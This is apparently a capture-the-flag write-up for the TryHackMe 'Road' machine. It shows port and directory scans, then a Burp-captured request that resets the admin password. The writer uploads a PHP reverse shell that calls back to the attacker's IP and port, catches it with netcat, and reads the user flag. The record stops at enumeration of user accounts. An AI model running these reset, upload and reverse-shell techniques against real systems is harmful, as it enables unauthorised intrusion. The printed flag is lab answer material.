---
Inspired by a real-world pentesting engagement
---

# Road — Writeup

## Overview
### Road — Writeup
### Road — Writeup
![](https://tryhackme-images.s3.amazonaws.com/room-icons/86d73ce54a3f392bd56336da012a8270.png)
![](https://i.ibb.co/rQD7Rqt/road-banner.png)

## Flags / Answers
- Start Machine
- As usual, obtain the user and root flag.
- Answer the questions below
```bash
- ┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.38.167 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.38.167:22
Open 10.10.38.167:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-26 12:48 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:48
Completed Parallel DNS resolution of 1 host. at 12:48, 0.03s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:48
Scanning 10.10.38.167 [2 ports]
Discovered open port 22/tcp on 10.10.38.167
Discovered open port 80/tcp on 10.10.38.167
Completed Connect Scan at 12:48, 0.20s elapsed (2 total ports)
Initiating Service scan at 12:48
Scanning 2 services on 10.10.38.167
Completed Service scan at 12:48, 6.44s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.38.167.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 6.17s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.80s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
Nmap scan report for 10.10.38.167
Host is up, received user-set (0.20s latency).
Scanned at 2023-02-26 12:48:45 EST for 14s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e6dc8869dea1738e845ba13e279f0724 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXhjztNjrxAn+QfSDb6ugzjCwso/WiGgq/BGXMrbqex9u5Nu1CKWtv7xiQpO84MsC2li6UkIAhWSMO0F//9odK1aRpPbH97e1ogBENN6YBP0s2z27aMwKh5UMyrzo5R42an3r6K+1x8lfrmW8VOOrvR4pZg9Mo+XNR/YU88P3XWq22DNPJqwtB3q4Sw6M/nxxUjd01kcbjwd1d9G+nuDNraYkA2T/OTHfp/xbhet9K6ccFHoi+A8r6aL0GV/qqW2pm4NdfgwKxM73VQzyolkG/+DFkZc+RCH73dYLEfVjMjTbZTA+19Zd2hlPJVtay+vOZr1qJ9ZUDawU7rEJgJ4hHDqlVjxX9Yv9SfFsw+Y0iwBfb9IMmevI3osNG6+2bChAtI2nUJv0g87I31fCbU5+NF8VkaGLz/sZrj5xFvyrjOpRnJW3djQKhk/Avfs2wkZ+GiyxBOZLetSDFvTAARmqaRqW9sjHl7w4w1+pkJ+dkeRsvSQlqw+AFX0MqFxzDF7M=
|   256 6bea185d8dc79e9a012cdd50c5f8c805 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNBLTibnpRB37eKji7C50xC9ujq7UyiFQSHondvOZOF7fZHPDn3L+wgNXEQ0wei6gzQfiZJmjQ5vQ88vEmCZzBI=
|   256 ef06d7e4b165156e9462ccddf08a1a24 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPv3g1IqvC7ol2xMww1gHLeYkyUIe8iKtEBXznpO25Ja
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-favicon: Unknown favicon MD5: FB0AA7D49532DA9D0006BA5595806138
|_http-title: Sky Couriers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.73 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.38.167 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.38.167
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/02/26 12:52:18 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.38.167/assets               (Status: 301) [Size: 313] [--> http://10.10.38.167/assets/]
http://10.10.38.167/v2                   (Status: 301) [Size: 309] [--> http://10.10.38.167/v2/]
Progress: 16450 / 220561 (7.46%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/02/26 12:53:19 Finished
===============================================================

http://10.10.38.167/v2/admin/login.html

register

now login

http://10.10.38.167/v2/index.php

Select Profile Image
Upload file
Right now, only admin has access to this feature. Please drop an email to admin@sky.thm in case of any changes. 

http://10.10.38.167/v2/ResetUser.php

using burp

Request:
POST /v2/lostpassword.php HTTP/1.1
Host: 10.10.38.167
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------12254366598020492221331034755
Content-Length: 642
Origin: http://10.10.38.167
Connection: close
Referer: http://10.10.38.167/v2/ResetUser.php
Cookie: PHPSESSID=up59mf2kj8t8euojipfgoki6cj; Bookings=0; Manifest=0; Pickup=0; Delivered=0; Delay=0; CODINR=0; POD=0; cu=0
Upgrade-Insecure-Requests: 1
-----------------------------12254366598020492221331034755
Content-Disposition: form-data; name="uname"
admin@sky.thm
-----------------------------12254366598020492221331034755
Content-Disposition: form-data; name="npass"
witty
-----------------------------12254366598020492221331034755
Content-Disposition: form-data; name="cpass"
witty
-----------------------------12254366598020492221331034755
Content-Disposition: form-data; name="ci_csrf_token"
-----------------------------12254366598020492221331034755
Content-Disposition: form-data; name="send"
Submit
-----------------------------12254366598020492221331034755--

Response:
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
refresh: 3;url=ResetUser.php
Content-Length: 37
Connection: close
Content-Type: text/html; charset=UTF-8
Password changed. 
Taking you back...

┌──(witty㉿kali)-[~/Downloads]
└─$ tail payload_ivan.php 
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1337);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>    

upload it then got to where it's uploaded

view-source:http://10.10.38.167/v2/profile.php

<!-- /v2/profileimages/ -->

http://10.10.38.167/v2/profileimages/payload_ivan.php

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.38.167] 53214
SOCKET: Shell has connected! PID: 1304
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@sky:/var/www/html/v2/profileimages$ cd /home/
cd /home/
www-data@sky:/home$ ls
ls
webdeveloper
www-data@sky:/home$ cd webdeveloper
cd webdeveloper
www-data@sky:/home/webdeveloper$ ls
ls
user.txt
www-data@sky:/home/webdeveloper$ cat user.txt
cat user.txt
63191e4ece37523c9fe6bb62a5e64d45

www-data@sky:/home/webdeveloper$ getent passwd
